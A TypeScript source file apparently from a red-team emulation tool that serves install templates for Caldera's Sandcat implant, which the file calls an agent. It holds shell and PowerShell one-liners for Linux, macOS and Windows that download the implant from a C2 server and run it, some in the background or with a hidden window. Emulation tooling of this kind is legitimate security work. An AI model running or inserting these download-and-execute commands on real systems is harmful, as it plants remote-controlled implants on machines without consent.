/**
 * Sandcat install commands, served by `agents.deployCommands`.
 *
 * These were Caldera's `/api/v2/deploy_commands` payloads; now that we run our
 * own C2 they live here. The `#{...}` placeholders are kept so the deploy modal
 * and `utils/deployCommand.ts` keep working unchanged — they are filled from the
 * AgentConfig row (`app.contact.http` = c2Url, `agents.implant_name`).
 *
 * Only variations that actually work against our C2 are included. Caldera also
 * ships GIST-C2, P2P-relay and compile-with-extensions variants; all of them
 * need either a non-HTTP contact or on-demand Go compilation, and we support
 * neither, so shipping them would hand operators commands that fail. (darwin
 * ARM64 *is* supported — the deploy command sends the host arch and the C2
 * serves the matching prebuilt binary.)
 */

export interface DeployVariation {
  description: string;
  command: string;
}

export interface DeployTemplate {
  platform: "linux" | "windows" | "darwin";
  executor: string;
  description: string;
  command: string;
  variations: DeployVariation[];
}

const AGENT_DESCRIPTION =
  "The default agent, written in GoLang. Communicates over the HTTP contact.";

// darwin ships for both amd64 and arm64, and the C2 serves the build matching
// the `architecture` header, so detect the host arch instead of assuming amd64.
const ARCH_PREAMBLE = `arch=$(uname -m | sed 's/x86_64/amd64/;s/aarch64/arm64/');`;
const archHeader = (platform: string) =>
  platform === "darwin" ? ' -H "architecture:$arch"' : "";
const archPreamble = (platform: string) =>
  platform === "darwin" ? ARCH_PREAMBLE : "";

const nixDefault = (platform: string) => `${archPreamble(platform)}server="#{app.contact.http}";
curl -s -X POST -H "file:sandcat.go" -H "platform:${platform}"${archHeader(platform)} $server/file/download > #{agents.implant_name};
chmod +x #{agents.implant_name};
./#{agents.implant_name} -server $server -group red -v`;

const nixGroup = (platform: string, group: string) =>
  `${archPreamble(platform)}server="#{app.contact.http}";curl -s -X POST -H "file:sandcat.go" -H "platform:${platform}"${archHeader(platform)} $server/file/download > #{agents.implant_name};chmod +x #{agents.implant_name};./#{agents.implant_name} -server $server -group ${group} -v`;

const nixBackground = (platform: string) =>
  `${archPreamble(platform)}server="#{app.contact.http}";agent=$(curl -svkOJ -X POST -H "file:sandcat.go" -H "platform:${platform}"${archHeader(platform)} $server/file/download 2>&1 | grep -i "Content-Disposition" | grep -io "filename=.*" | cut -d'=' -f2 | tr -d '"\\r') && chmod +x $agent 2>/dev/null;nohup ./$agent -server $server -group red &`;

export const DEPLOY_TEMPLATES: DeployTemplate[] = [
  {
    platform: "linux",
    executor: "sh",
    description: AGENT_DESCRIPTION,
    command: nixDefault("linux"),
    variations: [
      {
        description: "Deploy as a blue-team agent instead of red",
        command: nixGroup("linux", "blue"),
      },
      {
        description: "Download with a random name and start as a background process",
        command: nixBackground("linux"),
      },
    ],
  },
  {
    platform: "windows",
    executor: "psh",
    description: AGENT_DESCRIPTION,
    command: `$server="#{app.contact.http}";
$url="$server/file/download";
$wc=New-Object System.Net.WebClient;
$wc.Headers.add("platform","windows");
$wc.Headers.add("file","sandcat.go");
$data=$wc.DownloadData($url);
get-process | ? {$_.modules.filename -like "C:\\Users\\Public\\#{agents.implant_name}.exe"} | stop-process -f;
rm -force "C:\\Users\\Public\\#{agents.implant_name}.exe" -ea ignore;
[io.file]::WriteAllBytes("C:\\Users\\Public\\#{agents.implant_name}.exe",$data) | Out-Null;
Start-Process -FilePath C:\\Users\\Public\\#{agents.implant_name}.exe -ArgumentList "-server $server -group red" -WindowStyle hidden;`,
    variations: [
      {
        description: "Deploy as a blue-team agent instead of red",
        command: `$server="#{app.contact.http}";$url="$server/file/download";$wc=New-Object System.Net.WebClient;$wc.Headers.add("platform","windows");$wc.Headers.add("file","sandcat.go");$data=$wc.DownloadData($url);get-process | ? {$_.modules.filename -like "C:\\Users\\Public\\#{agents.implant_name}.exe"} | stop-process -f;rm -force "C:\\Users\\Public\\#{agents.implant_name}.exe" -ea ignore;[io.file]::WriteAllBytes("C:\\Users\\Public\\#{agents.implant_name}.exe",$data) | Out-Null;Start-Process -FilePath C:\\Users\\Public\\#{agents.implant_name}.exe -ArgumentList "-server $server -group blue" -WindowStyle hidden;`,
      },
    ],
  },
  {
    platform: "darwin",
    executor: "sh",
    description: AGENT_DESCRIPTION,
    command: nixDefault("darwin"),
    variations: [
      {
        description: "Deploy as a blue-team agent instead of red",
        command: nixGroup("darwin", "blue"),
      },
      {
        description: "Download with a random name and start as a background process",
        command: nixBackground("darwin"),
      },
    ],
  },
];
